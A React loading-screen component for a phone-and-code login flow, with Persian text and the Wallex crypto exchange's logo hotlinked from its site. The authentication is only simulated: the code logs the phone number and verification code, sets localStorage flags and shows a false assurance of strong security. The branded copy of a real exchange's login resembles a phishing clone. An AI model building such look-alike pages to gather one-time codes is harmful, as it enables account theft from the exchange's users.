import { useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Loader2 } from "lucide-react";

const Loading = () => {
  const location = useLocation();
  const navigate = useNavigate();

  const phoneNumber = location.state?.phoneNumber || "";
  const verificationCode = location.state?.verificationCode || "";

  useEffect(() => {
    // Simulate authentication process
    const authenticateUser = async () => {
      try {
        // Simulate API call for authentication
        console.log("Authenticating user with:", {
          phoneNumber,
          verificationCode,
        });

        // Simulate delay for authentication process
        await new Promise((resolve) => setTimeout(resolve, 3000));

        // In a real app, you would make an API call to verify the code
        // and receive a JWT token or session info

        // For now, we'll just simulate successful authentication
        localStorage.setItem("isAuthenticated", "true");
        localStorage.setItem("userPhone", phoneNumber);

        // Redirect to dashboard or main app
        // Since this is a demo, we'll redirect back to home with success message
        alert("ورود موفقیت‌آمیز! خوش آمدید.");
        navigate("/", { replace: true });
      } catch (error) {
        console.error("Authentication failed:", error);
        // Redirect back to verification page with error
        navigate("/verify-phone", {
          state: {
            phoneNumber,
            error: "خطا در احراز هویت. لطفا دوباره تلاش کنید.",
          },
          replace: true,
        });
      }
    };

    if (phoneNumber && verificationCode) {
      authenticateUser();
    } else {
      // If required data is missing, redirect to home
      navigate("/", { replace: true });
    }
  }, [phoneNumber, verificationCode, navigate]);

  return (
    <div
      style={{
        display: "flex",
        height: "100vh",
        backgroundColor: "rgb(14, 35, 66)",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <div
        style={{
          backgroundColor: "rgb(255, 255, 255)",
          borderRadius: "16px",
          padding: "40px",
          maxWidth: "400px",
          width: "90%",
          textAlign: "center",
        }}
        className="loading-card"
      >
        {/* Header */}
        <div
          style={{
            display: "flex",
            justifyContent: "center",
            marginBottom: "24px",
          }}
        >
          <img
            src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
            alt="صرافی خرید فروش ارزهای دیجیتال"
            style={{
              width: "128px",
              height: "24px",
              objectFit: "contain",
            }}
          />
        </div>

        {/* Loading Animation */}
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            gap: "20px",
          }}
        >
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              width: "80px",
              height: "80px",
              backgroundColor: "rgb(23, 29, 38)",
              borderRadius: "50%",
            }}
          >
            <Loader2
              className="animate-spin"
              style={{
                width: "40px",
                height: "40px",
                color: "rgb(255, 255, 255)",
              }}
            />
          </div>

          <div
            style={{
              display: "flex",
              flexDirection: "column",
              gap: "8px",
              textAlign: "center",
            }}
          >
            <h2
              style={{
                fontSize: "18px",
                fontWeight: "700",
                color: "rgb(0, 0, 0)",
                margin: "0",
              }}
            >
              در حال احراز هویت...
            </h2>
            <p
              style={{
                fontSize: "14px",
                color: "rgba(0, 0, 0, 0.6)",
                margin: "0",
                lineHeight: "1.5",
              }}
            >
              لطفا صبر کنید، در حال بررسی اطلاعات شما هستیم
            </p>
          </div>

          {/* Progress Dots */}
          <div
            style={{
              display: "flex",
              gap: "8px",
              alignItems: "center",
            }}
          >
            {[0, 1, 2].map((index) => (
              <div
                key={index}
                style={{
                  width: "8px",
                  height: "8px",
                  backgroundColor: "rgb(0, 122, 255)",
                  borderRadius: "50%",
                  animation: `bounce ${1.4}s ease-in-out ${index * 0.16}s infinite both`,
                }}
              />
            ))}
          </div>
        </div>

        {/* Security Note */}
        <div
          style={{
            marginTop: "32px",
            padding: "16px",
            backgroundColor: "rgb(248, 249, 250)",
            borderRadius: "8px",
            border: "1px solid rgba(0, 0, 0, 0.1)",
          }}
        >
          <p
            style={{
              fontSize: "12px",
              color: "rgba(0, 0, 0, 0.6)",
              margin: "0",
              lineHeight: "1.4",
            }}
          >
            🔒 اطلاعات شما با بالاترین استانداردهای امنیتی محافظت می‌شود
          </p>
        </div>
      </div>

      <style jsx>{`
        @keyframes bounce {
          0%,
          80%,
          100% {
            transform: scale(0);
          }
          40% {
            transform: scale(1);
          }
        }

        /* Mobile styles */
        @media (max-width: 1023px) {
          .loading-card {
            border-radius: 0 !important;
            width: 100% !important;
            height: 100vh !important;
            max-width: none !important;
            display: flex !important;
            flex-direction: column !important;
            justify-content: center !important;
            padding: 20px !important;
          }
        }
      `}</style>
    </div>
  );
};

export default Loading;
